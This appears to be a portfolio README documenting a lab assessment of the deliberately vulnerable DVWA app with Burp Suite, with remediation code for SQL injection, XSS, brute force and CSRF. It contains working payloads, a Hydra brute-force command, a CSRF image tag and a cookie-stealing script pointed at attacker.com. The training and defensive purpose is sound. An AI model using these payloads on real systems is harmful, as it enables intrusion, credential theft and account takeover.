# Web Application Vulnerability Assessment with Burp Suite

![Cybersecurity](https://img.shields.io/badge/Cybersecurity-Security%20Assessment-red?style=for-the-badge&logo=security&logoColor=white)
![SOC](https://img.shields.io/badge/SOC-Level%201-blue?style=for-the-badge&logo=shield&logoColor=white)
![Burp Suite](https://img.shields.io/badge/Burp%20Suite-Web%20Security-orange?style=for-the-badge&logo=burpsuite&logoColor=white)
![OWASP](https://img.shields.io/badge/OWASP-Top%2010-green?style=for-the-badge&logo=owasp&logoColor=white)
![Kali Linux](https://img.shields.io/badge/Kali%20Linux-Testing%20Platform-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Status](https://img.shields.io/badge/Status-Complete-success?style=for-the-badge)

**Project Type:** SOC Level 1 Security Assessment  
**Tools Used:** Burp Suite Community Edition, DVWA, Kali Linux, VirtualBox  
**Date:** February 2026

---

## 📋 Table of Contents
- [Executive Summary](#executive-summary)
- [Project Objectives](#project-objectives)
- [Lab Environment Setup](#lab-environment-setup)
- [Methodology](#methodology)
- [Vulnerabilities Identified](#vulnerabilities-identified)
  - [1. SQL Injection](#1-sql-injection)
  - [2. Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
  - [3. Brute Force Attack](#3-brute-force-attack)
  - [4. Cross-Site Request Forgery (CSRF)](#4-cross-site-request-forgery-csrf)
- [Remediation Recommendations](#remediation-recommendations)
- [Skills Demonstrated](#skills-demonstrated)
- [Conclusion](#conclusion)

---

## 🎯 Executive Summary

This project demonstrates a professional web application security assessment conducted using industry-standard tools and methodologies. As a SOC L1 analyst would, I identified, documented, and analyzed **four critical vulnerabilities** in a deliberately vulnerable web application (DVWA) using **Burp Suite** as an intercepting proxy.

**Key Findings:**
- ✅ SQL Injection - Database exposed all user records
- ✅ Cross-Site Scripting (XSS) - Arbitrary JavaScript execution
- ✅ Brute Force - Credentials exposed in URL parameters
- ✅ CSRF - Unauthorized actions via crafted requests

This assessment simulates real-world security testing that SOC analysts perform to identify and mitigate web application threats.

---

## 🚀 Project Objectives

### Why We Built This Project

1. **Demonstrate SOC L1 Skills**: Show practical ability to identify and document web vulnerabilities
2. **Master Industry Tools**: Gain hands-on experience with Burp Suite, the industry standard for web security testing
3. **Real-World Simulation**: Practice vulnerability assessment methodology used by security professionals
4. **Documentation Excellence**: Create professional security reports with evidence and remediation steps

---

## 🛠️ Lab Environment Setup

### Architecture Overview
```
Windows 10 Host (Wi-Fi)
    │
    ├── Firefox Browser (Proxy: 127.0.0.1:8080)
    │
    └── Burp Suite Community Edition
            │
            └── Intercepts traffic to →
                    │
                    └── Kali Linux VM (Bridged Adapter)
                            │
                            ├── Apache2 Web Server
                            ├── MySQL Database
                            └── DVWA Application (10.83.80.7)
```

### Setup Steps

#### **Step 1: Configure Kali Linux Environment**

**Network Configuration:**
- VirtualBox Network Adapter: **Bridged Adapter**
- Adapter Type: **Paravirtualized Network (virtio-net)** for optimal performance
- Kali IP Address: `10.83.80.7`

![Kali IP Configuration](screenshots/SOC4_01_kali_ip_address.png)

**Install and Configure DVWA:**
```bash
# Update package repository
sudo apt update

# Install DVWA
sudo apt install dvwa -y

# Start required services
sudo systemctl start apache2
sudo systemctl start mysql
```

![Apache Running](screenshots/SOC4_02_apache_running.png)

![MySQL Running](screenshots/SOC4_03_mysql_running.png)

**Database Setup:**
```sql
# Create DVWA database and user
sudo mysql -u root

CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

![MySQL Database Setup](screenshots/SOC4_04_mysql_database_setup.png)

**Create symbolic link for web access:**
```bash
sudo ln -s /usr/share/dvwa /var/www/html/dvwa
```

#### **Step 2: Initialize DVWA**

Access DVWA setup page in Firefox:
```
http://10.83.80.7/dvwa/setup.php
```

![DVWA Setup Page](screenshots/SOC4_05_dvwa_setup_page.png)

Click **"Create / Reset Database"** to initialize the application.

![DVWA Login Page](screenshots/SOC4_06_dvwa_login_page.png)

**Login with default credentials:**
- Username: `admin`
- Password: `password`

![DVWA Home Page](screenshots/SOC4_06_1_dvwa_home_logged_in.png)

#### **Step 3: Configure Security Level**

Set DVWA Security Level to **"Low"** to test vulnerabilities:

![DVWA Security Level Low](screenshots/SOC4_11_dvwa_security_level_low.png)

---

#### **Step 4: Install and Configure Burp Suite**

**Install Burp Suite Community Edition on Windows 10:**

1. Download from: `https://portswigger.net/burp/communitydownload`
2. Install with default settings
3. Launch Burp Suite
   - Select: **Temporary Project** → Next
   - Use: **Burp Defaults** → Start Burp

![Burp Suite Launched](screenshots/SOC4_07_burp_suite_launched.png)

**Configure Firefox Proxy Settings:**

1. Firefox → Settings → Network Settings → Settings
2. Select **Manual proxy configuration**
3. HTTP Proxy: `127.0.0.1` Port: `8080`
4. Check: **"Also use this proxy for HTTPS"**

![Firefox Proxy Configuration](screenshots/SOC4_08_firefox_proxy_config.png)

**Verify Traffic Interception:**

Access DVWA through Firefox - Burp Suite should intercept the request:

![Burp Intercept DVWA Request](screenshots/SOC4_09_burp_intercept_dvwa_request.png)

Turn **Intercept OFF** to allow normal traffic flow:

![DVWA Loaded via Burp Proxy](screenshots/SOC4_10_dvwa_loaded_with_burp_proxy.png)

---

## 🔍 Methodology

### Assessment Approach

This security assessment follows the **OWASP Testing Methodology**:

1. **Information Gathering** - Understand application structure
2. **Vulnerability Identification** - Test for common web vulnerabilities
3. **Exploitation** - Demonstrate security impact
4. **Traffic Analysis** - Use Burp Suite to analyze HTTP requests/responses
5. **Documentation** - Record findings with evidence

### Testing Scope

**In Scope:**
- SQL Injection vulnerabilities
- Cross-Site Scripting (XSS)
- Authentication weaknesses (Brute Force)
- Cross-Site Request Forgery (CSRF)

**Testing Methodology:**
- Manual testing with Burp Suite
- Payload crafting and injection
- Traffic interception and analysis
- Evidence collection via screenshots

---

## 🔓 Vulnerabilities Identified

### 1. SQL Injection

**Severity:** 🔴 **CRITICAL**  
**CVSS Score:** 9.8  
**OWASP Top 10:** A03:2021 – Injection

#### Description

SQL Injection allows attackers to manipulate database queries through unsanitized user input. This can lead to unauthorized data access, data modification, or complete database compromise.

#### Testing Process

**Normal Request:**

Input: `1`

![SQL Injection Normal Test](screenshots/SOC4_12_sql_injection_normal_test.png)

Returns single user:
```
ID: 1
First name: admin
Surname: admin
```

**Malicious Payload:**

Input: `1' OR '1'='1`

![SQL Injection Exploit Success](screenshots/SOC4_13_sql_injection_exploit_success.png)

#### Impact

The injected SQL payload bypassed authentication logic and returned **ALL users** from the database:
- admin
- Gordon Brown
- Hack Me
- Pablo Picasso
- Bob Smith

#### Burp Suite Analysis

![Burp SQL Injection Request Analysis](screenshots/SOC4_14_burp_sql_injection_request_analysis.png)

**Request Details:**
```http
GET /dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit HTTP/1.1
Host: 10.83.80.7
```

The vulnerable backend SQL query:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'
```

Since `'1'='1'` is always true, the query returns all records.

#### Business Impact

- **Data Breach**: Attackers can extract entire database contents
- **Authentication Bypass**: Login forms can be bypassed
- **Data Manipulation**: INSERT, UPDATE, DELETE operations possible
- **System Compromise**: Potential OS command execution via SQL functions

---

### 2. Cross-Site Scripting (XSS)

**Severity:** 🟠 **HIGH**  
**CVSS Score:** 7.3  
**OWASP Top 10:** A03:2021 – Injection

#### Description

XSS vulnerabilities allow attackers to inject malicious JavaScript that executes in victims' browsers. This can lead to session hijacking, credential theft, and malware distribution.

#### Testing Process

**Normal Request:**

Input: `Test User`

![XSS Normal Test](screenshots/SOC4_15_xss_normal_test.png)

Response:
```
Hello Test User
```

**Malicious Payload:**

Input: `<script>alert('XSS Vulnerability Found!')</script>`

![XSS Exploit Alert Popup](screenshots/SOC4_16_xss_exploit_alert_popup.png)

#### Impact

The JavaScript payload executed successfully, displaying an alert popup. In a real attack scenario, this could be used to:
- Steal session cookies
- Redirect users to phishing sites
- Inject keyloggers
- Deface the website

#### Burp Suite Analysis

![Burp XSS Request Analysis](screenshots/SOC4_17_burp_xss_request_analysis.png)

**Request Details:**
```http
GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS+Vulnerability+Found%21%27%29%3C%2Fscript%3E HTTP/1.1
```

The application reflects user input directly into HTML without sanitization:
```html
<pre>Hello <script>alert('XSS Vulnerability Found!')</script></pre>
```

#### Real-World Attack Scenario

**Session Hijacking:**
```javascript
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>
```

This would send the victim's session cookie to the attacker's server.

---

### 3. Brute Force Attack

**Severity:** 🟠 **HIGH**  
**CVSS Score:** 7.5  
**OWASP Top 10:** A07:2021 – Identification and Authentication Failures

#### Description

The application lacks protection against automated login attempts, allowing attackers to perform brute force attacks to guess credentials. Additionally, credentials are transmitted in URL parameters (GET method), exposing them in logs and browser history.

#### Testing Process

**Successful Login:**

Credentials: `admin` / `password`

![Brute Force Successful Login](screenshots/SOC4_18_brute_force_successful_login.png)

Response:
```
Welcome to the password protected area admin
```

**Failed Login Attempt:**

Credentials: `admin` / `3232` (incorrect password)

![Brute Force Failed Attempt](screenshots/SOC4_19_brute_force_failed_attempt.png)

Response:
```
Username and/or password incorrect.
```

#### Burp Suite Analysis

![Burp Brute Force Analysis](screenshots/SOC4_20_burp_brute_force_analysis.png)

**Critical Security Flaw - Credentials in URL:**
```http
GET /dvwa/vulnerabilities/brute/?username=admin&password=3232&Login=Login HTTP/1.1
```

**Problems Identified:**

1. **No Rate Limiting**: Unlimited login attempts allowed
2. **GET Method Used**: Credentials exposed in URL
3. **No CAPTCHA**: Automated attacks possible
4. **Credentials Logged**: Server logs contain passwords
5. **Browser History**: Passwords stored in browser history

#### Impact

**Automated Brute Force:**
An attacker can use tools like Burp Intruder or Hydra to test thousands of password combinations:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.83.80.7 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect"
```

**Credential Exposure:**
- Passwords visible in proxy logs
- Passwords in web server access logs
- Passwords in browser history
- Network traffic sniffing exposes credentials

---

### 4. Cross-Site Request Forgery (CSRF)

**Severity:** 🟡 **MEDIUM**  
**CVSS Score:** 6.5  
**OWASP Top 10:** A01:2021 – Broken Access Control

#### Description

CSRF vulnerabilities allow attackers to trick authenticated users into performing unwanted actions. The application lacks anti-CSRF tokens, enabling attackers to craft malicious requests that execute with the victim's privileges.

#### Testing Process

**Password Change Request:**

New Password: `newpass123`

![CSRF Password Change Success](screenshots/SOC4_21_csrf_password_change_success.png)

Response:
```
Password Changed.
```

#### Burp Suite Analysis

![Burp CSRF Request Analysis](screenshots/SOC4_22_burp_csrf_request_analysis.png)

**Request Details:**
```http
GET /dvwa/vulnerabilities/csrf/?password_new=newpass123&password_conf=newpass123&Change=Change HTTP/1.1
Host: 10.83.80.7
Cookie: security=low; PHPSESSID=cb6c2c8008bacc26e10a8795c2efd72
```

**Critical Vulnerabilities:**

1. **No CSRF Token**: Request lacks anti-CSRF protection
2. **GET Method**: State-changing operation via GET
3. **Password in URL**: Sensitive data exposed in URL
4. **No Re-authentication**: No password verification required

#### Attack Scenario

**Malicious Link:**

An attacker can craft a URL and send it to the victim:
```html
<img src="http://10.83.80.7/dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change" />
```

**Attack Vector:**

1. Attacker sends phishing email with malicious link
2. Victim (logged into DVWA) clicks the link
3. Browser automatically sends authenticated request
4. Victim's password changes to `hacked123`
5. Victim doesn't know their password was changed
6. Attacker logs in with new password

#### Impact

- **Account Takeover**: Attacker gains full account access
- **Unauthorized Actions**: Any privileged action can be performed
- **Data Manipulation**: Modify user data without consent
- **Privilege Escalation**: If admin account compromised

---

## 🛡️ Remediation Recommendations

### 1. SQL Injection - Fixes

**Priority:** 🔴 **CRITICAL - Immediate Action Required**

#### Recommended Solutions:

**A. Use Prepared Statements (Parameterized Queries)**

❌ **Vulnerable Code:**
```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

✅ **Secure Code (PHP PDO):**
```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();
```

**B. Input Validation**
```php
// Whitelist validation
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false) {
    die("Invalid input");
}
```

**C. Least Privilege Database Access**

- Create dedicated database user with SELECT-only permissions
- Revoke DROP, INSERT, UPDATE, DELETE privileges
- Use separate credentials for different application functions

---

### 2. Cross-Site Scripting (XSS) - Fixes

**Priority:** 🟠 **HIGH - Fix Within 7 Days**

#### Recommended Solutions:

**A. Output Encoding**

❌ **Vulnerable Code:**
```php
echo "Hello " . $_GET['name'];
```

✅ **Secure Code:**
```php
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

**B. Content Security Policy (CSP)**

Add HTTP header:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

**C. Input Validation**
```php
// Sanitize input
$name = filter_var($_GET['name'], FILTER_SANITIZE_STRING);
```

---

### 3. Brute Force - Fixes

**Priority:** 🟠 **HIGH - Fix Within 7 Days**

#### Recommended Solutions:

**A. Implement Rate Limiting**
```php
// Allow only 5 attempts per 15 minutes per IP
$max_attempts = 5;
$lockout_time = 900; // 15 minutes

// Track failed attempts in database or Redis
```

**B. Use POST Method for Authentication**

❌ **Vulnerable:**
```html
<form action="login.php" method="GET">
```

✅ **Secure:**
```html
<form action="login.php" method="POST">
```

**C. Add CAPTCHA After Failed Attempts**

Implement reCAPTCHA v3 after 3 failed login attempts.

**D. Account Lockout Policy**

- Lock account after 5 failed attempts
- Require email verification to unlock
- Notify user of suspicious login attempts

**E. Use HTTPS**

Encrypt credentials in transit with TLS/SSL.

---

### 4. CSRF - Fixes

**Priority:** 🟡 **MEDIUM - Fix Within 30 Days**

#### Recommended Solutions:

**A. Implement Anti-CSRF Tokens**

✅ **Secure Implementation:**
```php
// Generate token
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// In form
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

// Validate token
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die("CSRF token validation failed");
}
```

**B. Use POST Method for State-Changing Operations**

- Password changes should use POST
- Never use GET for operations that modify data

**C. Require Re-authentication for Sensitive Actions**
```php
// Require current password when changing password
if (!verify_password($_POST['current_password'], $user['password'])) {
    die("Current password incorrect");
}
```

**D. SameSite Cookie Attribute**
```php
setcookie("PHPSESSID", $session_id, [
    'samesite' => 'Strict',
    'secure' => true,
    'httponly' => true
]);
```

---

## 💼 Skills Demonstrated

This project showcases essential SOC L1 analyst competencies:

### Technical Skills

✅ **Network Configuration**
- Configured bridged networking between host and VM
- Troubleshot network connectivity issues
- Optimized VM performance with paravirtualized adapters

✅ **Web Application Security Testing**
- Identified OWASP Top 10 vulnerabilities
- Crafted exploitation payloads
- Analyzed application behavior under attack

✅ **Traffic Analysis with Burp Suite**
- Configured proxy interception
- Analyzed HTTP requests and responses
- Identified security flaws in client-server communication

✅ **Linux System Administration**
- Installed and configured Apache, MySQL
- Managed services with systemctl
- Performed database operations

✅ **Vulnerability Assessment Methodology**
- Systematic testing approach
- Evidence collection and documentation
- Risk analysis and prioritization

### Soft Skills

✅ **Technical Documentation**
- Created professional security assessment reports
- Documented findings with clear evidence
- Provided actionable remediation guidance

✅ **Attention to Detail**
- Captured detailed screenshots at each step
- Recorded exact payloads and responses
- Noted specific security implications

✅ **Problem-Solving**
- Troubleshot configuration issues independently
- Adapted when encountering unexpected problems
- Completed comprehensive assessment despite challenges

---

## 🎓 Tools & Technologies

| Tool | Purpose | Version |
|------|---------|---------|
| **Burp Suite Community Edition** | Web proxy & security testing | v2026.1.3 |
| **DVWA** | Vulnerable web application | Latest |
| **Kali Linux** | Security testing platform | 2026-W06 |
| **Apache** | Web server | 2.4.66 |
| **MySQL/MariaDB** | Database server | 11.8.5 |
| **Firefox** | Web browser | 147.0 |
| **VirtualBox** | Virtualization platform | Latest |

---

## 📊 Vulnerability Summary

| # | Vulnerability | Severity | CVSS | Status |
|---|--------------|----------|------|--------|
| 1 | SQL Injection | 🔴 Critical | 9.8 | Documented |
| 2 | Cross-Site Scripting (XSS) | 🟠 High | 7.3 | Documented |
| 3 | Brute Force Attack | 🟠 High | 7.5 | Documented |
| 4 | CSRF | 🟡 Medium | 6.5 | Documented |

---

## 🎯 Conclusion

This project successfully demonstrates the practical skills required for a **SOC Level 1 Analyst** position. Through systematic vulnerability assessment using industry-standard tools, I:

1. **Identified** four critical web application vulnerabilities
2. **Exploited** each vulnerability to demonstrate real-world impact
3. **Analyzed** attack traffic using Burp Suite intercepting proxy
4. **Documented** findings with detailed evidence and screenshots
5. **Recommended** specific remediation strategies for each vulnerability

### Key Takeaways

- **Hands-on Experience**: Practical application of security concepts
- **Industry Tools**: Proficiency with Burp Suite, standard in professional pentesting
- **Methodology**: Followed OWASP testing guidelines
- **Communication**: Translated technical findings into actionable recommendations

This assessment mirrors real-world security work performed by SOC analysts, demonstrating readiness for an entry-level cybersecurity role.

---

## 📬 Contact

**LinkedIn:** [Your LinkedIn Profile]  
**GitHub:** [Your GitHub Profile]  
**Email:** [Your Email]

---

## 📄 License

This project is for educational purposes only. DVWA should only be used in isolated lab environments.

---

## 🙏 Acknowledgments

- **DVWA Team** - For creating an excellent vulnerable application for security training
- **PortSwigger** - For Burp Suite Community Edition
- **OWASP** - For web security testing guidelines

---

**⭐ If you found this project helpful, please consider giving it a star!**
